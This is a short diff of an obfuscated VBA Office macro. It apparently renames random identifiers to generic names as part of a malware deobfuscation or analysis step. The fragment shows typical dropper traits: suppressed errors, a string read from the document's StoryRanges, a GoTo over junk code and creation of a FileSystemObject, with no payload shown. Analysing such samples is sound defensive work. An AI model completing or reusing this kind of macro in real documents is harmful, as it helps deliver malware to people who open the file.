@@ -1,7 +1,7 @@
-Attribute VB_Name = "Zm6erye0ms_u"
-Function R56_jx62hkjlsm()
+Attribute VB_Name = "Macro_3"
+Function Func_1()
 On Error Resume Next
-mKbjhqs = T77vhvocooru69svd.StoryRanges.Item(4 / 4)
+mKbjhqs = Macro_2.StoryRanges.Item(4 / 4)
    GoTo GfsQIDHId
 Dim CrIUuEVIH As Object
 Set CrIUuEVIH = CreateObject("Scripting.FileSystemObject")
